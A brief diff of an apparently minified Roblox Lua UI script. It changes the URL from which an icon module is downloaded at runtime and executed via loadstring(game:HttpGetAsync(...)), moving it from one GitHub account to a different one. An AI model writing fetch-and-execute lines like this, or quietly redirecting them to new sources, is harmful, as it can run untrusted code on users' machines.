@@ -28,7 +28,7 @@ local e=game:GetService"UserInputService"
 local f=game:GetService"TweenService"
 local g=game:GetService"LocalizationService"
 
-local h=loadstring(game:HttpGetAsync"https://raw.githubusercontent.com/Footagesus/Icons/main/Main-v2.lua")()
+local h=loadstring(game:HttpGetAsync"https://raw.githubusercontent.com/iqoksz95-debug/general/refs/heads/main/Main-v2.lua")()
 h.SetIconsType"lucide"
 
 
